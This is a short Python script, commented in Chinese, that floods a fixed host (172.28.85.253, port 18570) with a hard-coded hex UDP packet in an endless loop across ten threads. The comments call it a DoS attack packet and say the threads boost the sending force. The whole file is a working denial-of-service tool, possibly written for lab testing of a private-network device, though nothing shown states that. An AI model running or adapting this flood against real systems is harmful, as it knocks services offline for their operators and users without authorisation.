import socket
import threading

def send_packet():
    try:
        # 创建UDP套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        sock.connect(('172.28.85.253', 18570)) #18572，18570
        
        # 定义DOS攻击数据包
        payload = 'fd200000a6ffbe4c00000000000000000000000000000000000000000000000000000000204116000101ce28'
        
        # 将16进制报文转换为二进制数据
        bin_msg = bytes.fromhex(payload)
        
        # 循环发送数据包以模拟DOS攻击
        while True:
            sock.sendall(bin_msg)
    except Exception as e:
        print(f"发生错误: {e}")
    finally:
        sock.close()

# 使用多线程增强发送力度
threads = []
for i in range(10):  # 创建10个线程
    thread = threading.Thread(target=send_packet)
    thread.start()
    threads.append(thread)

# 等待所有线程完成
for thread in threads:
    thread.join()